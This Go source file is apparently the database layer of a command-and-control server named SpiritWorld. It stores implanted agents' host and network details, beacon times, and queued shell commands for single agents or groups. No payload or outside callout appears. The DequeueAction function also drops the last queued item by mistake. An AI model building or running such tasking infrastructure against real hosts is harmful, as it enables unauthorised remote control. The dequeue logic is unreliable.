package database

import (
	"github.com/f1rehaz4rd/SpiritWorld/c2/pkg/api"
	"github.com/google/uuid"

	"github.com/lib/pq"
	_ "github.com/lib/pq"
)

func (model *DatabaseModel) InsertAgent(register api.RegisterAgent) bool {

	sqlStatment := `
	INSERT INTO agent (
		uuid, 
		agentname, 
		agentversion, 
		primaryip, 
		hostname, 
		mac, 
		agentos, 
		otherips,
		publicip
		) VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9)
	`

	agent := register.Agent
	model.mutex.Lock()
	_, err := model.db.Exec(sqlStatment,
		agent.UUID,
		agent.AgentName,
		agent.AgentVersion,
		agent.PrimaryIP,
		agent.Hostname,
		agent.MAC,
		agent.AgentOS,
		pq.Array(agent.OtherIPs),
		register.PublicIP)
	model.mutex.Unlock()

	if err != nil {
		return false
	}

	sqlStatment = `
	INSERT INTO agentbeacon (
		uuid,
		registertime,
		lastbeacon,
		actionqueue,
		actions
	) VALUES ($1, $2, $3, $4, $5)
	`

	_, err = model.db.Exec(sqlStatment,
		agent.UUID,
		register.RegisterTime,
		register.RegisterTime,
		pq.Array([]string{}),
		pq.Array([]string{}))
	if err != nil {
		return false
	}

	return true
}

func (model *DatabaseModel) UpdateAgent(beacon api.BeaconAgent) bool {
	sqlStatment := `
	UPDATE agentbeacon
	SET lastbeacon = $2
	WHERE uuid = $1;
	`

	model.mutex.Lock()
	_, err := model.db.Exec(sqlStatment,
		beacon.Agent.UUID,
		beacon.BeaconTime)
	model.mutex.Unlock()

	if err != nil {
		return false
	}

	return true
}

func (model *DatabaseModel) InsertAction(action ActionModel) bool {

	sqlStatement := `
	INSERT INTO actions (
		uuid,
		agentuuid,
		actiontype,
		actioncmd,
		actionresponse
	) VALUES ($1, $2, $3, $4, $5)
	`

	model.mutex.Lock()
	_, err := model.db.Exec(sqlStatement,
		action.UUID,
		action.AgentUUID,
		action.ActionType,
		action.ActionCmd,
		"")
	model.mutex.Unlock()

	if err != nil {
		return false
	}

	agent, _ := model.GetAgentByID(action.AgentUUID)
	agent.Beacon.ActionQueue = append(agent.Beacon.ActionQueue, action.UUID)
	agent.Beacon.Actions = append(agent.Beacon.Actions, action.UUID)

	sqlStatement = `
	UPDATE agentbeacon
	SET actionqueue = $2, actions = $3
	WHERE uuid = $1;
	`

	model.mutex.Lock()
	_, err = model.db.Exec(sqlStatement,
		action.AgentUUID,
		pq.Array(agent.Beacon.ActionQueue),
		pq.Array(agent.Beacon.Actions))
	model.mutex.Unlock()

	if err != nil {
		return false
	}

	return true
}

func (model *DatabaseModel) DequeueAction(action ActionModel) bool {

	agent, _ := model.GetAgentByID(action.AgentUUID)

	if len(agent.Beacon.ActionQueue) > 1 {
		agent.Beacon.ActionQueue =
			agent.Beacon.ActionQueue[1 : len(agent.Beacon.ActionQueue)-1]
	} else {
		agent.Beacon.ActionQueue = []string{}
	}

	sqlStatement := `
	UPDATE agentbeacon
	SET actionqueue = $2
	WHERE uuid = $1;
	`

	model.mutex.Lock()
	_, err := model.db.Exec(sqlStatement,
		action.AgentUUID,
		pq.Array(agent.Beacon.ActionQueue))
	model.mutex.Unlock()

	if err != nil {
		return false
	}

	return true
}

func (model *DatabaseModel) InsertGroupAction(name, actionType, cmd string) bool {

	group, err := model.GetGroupByID(name)
	if err != nil {
		return false
	}

	for i := 0; i < len(group.AgentsUUIDs); i++ {

		action := ActionModel{
			ActionType: actionType,
			ActionCmd:  cmd,
			UUID:       uuid.New().String(),
			AgentUUID:  group.AgentsUUIDs[i],
		}

		sqlStatement := `
		INSERT INTO actions (
			uuid,
			agentuuid,
			actiontype,
			actioncmd,
			actionresponse
		) VALUES ($1, $2, $3, $4, $5)
		`

		model.mutex.Lock()
		_, err := model.db.Exec(sqlStatement,
			action.UUID,
			action.AgentUUID,
			action.ActionType,
			action.ActionCmd,
			"")
		model.mutex.Unlock()

		if err != nil {
			return false
		}

		agent, _ := model.GetAgentByID(action.AgentUUID)
		agent.Beacon.ActionQueue = append(agent.Beacon.ActionQueue, action.UUID)
		agent.Beacon.Actions = append(agent.Beacon.Actions, action.UUID)

		sqlStatement = `
		UPDATE agentbeacon
		SET actionqueue = $2, actions = $3
		WHERE uuid = $1;
		`

		model.mutex.Lock()
		_, err = model.db.Exec(sqlStatement,
			action.AgentUUID,
			pq.Array(agent.Beacon.ActionQueue),
			pq.Array(agent.Beacon.Actions))
		model.mutex.Unlock()

		if err != nil {
			return false
		}
	}

	return true
}

func (model *DatabaseModel) UpdateAction(action ActionModel) bool {
	sqlStatment := `
	UPDATE actions
	SET actionresponse = $2
	WHERE uuid = $1;
	`

	model.mutex.Lock()
	_, err := model.db.Exec(sqlStatment,
		action.UUID,
		action.ActionOutput)
	model.mutex.Unlock()

	if err != nil {
		return false
	}

	return true
}

func (model *DatabaseModel) CreateGroup(group GroupModel) bool {
	sqlStatment := `
	INSERT INTO groups (
		groupname,
		agentuuids
	) VALUES ($1, $2)
	`

	model.mutex.Lock()
	_, err := model.db.Exec(sqlStatment,
		group.GroupName,
		pq.Array([]string{}))
	model.mutex.Unlock()

	if err != nil {
		return false
	}

	return true
}

func (model *DatabaseModel) InsertIntoGroup(name string, id string) bool {
	group, err := model.GetGroupByID(name)
	if err != nil {
		return false
	}

	_, err = model.GetAgentByID(id)
	if err != nil {
		return false
	}

	group.AgentsUUIDs = append(group.AgentsUUIDs, id)

	sqlStatement := `
	UPDATE groups
	SET agentuuids = $2
	WHERE groupname = $1;
	`

	model.mutex.Lock()
	_, err = model.db.Exec(sqlStatement,
		name,
		pq.Array(group.AgentsUUIDs))
	model.mutex.Unlock()

	if err != nil {
		return false
	}

	return true
}

func (model *DatabaseModel) RemoveFromGroup(name string, id string) bool {
	group, err := model.GetGroupByID(name)
	if err != nil {
		return false
	}

	check := false
	var idx int
	for i := 0; i < len(group.AgentsUUIDs); i++ {
		if group.AgentsUUIDs[i] == id {
			check = true
			idx = i
			break
		}
	}

	if !check {
		return !check
	}

	if len(group.AgentsUUIDs) > 1 {
		group.AgentsUUIDs[len(group.AgentsUUIDs)-1], group.AgentsUUIDs[idx] =
			group.AgentsUUIDs[idx], group.AgentsUUIDs[len(group.AgentsUUIDs)-1]

		group.AgentsUUIDs = group.AgentsUUIDs[:len(group.AgentsUUIDs)-1]
	} else {
		group.AgentsUUIDs = []string{}
	}

	sqlStatement := `
	UPDATE groups
	SET agentuuids = $2
	WHERE groupname = $1;
	`

	model.mutex.Lock()
	_, err = model.db.Exec(sqlStatement,
		name,
		pq.Array(group.AgentsUUIDs))
	model.mutex.Unlock()

	if err != nil {
		return false
	}

	return true
}
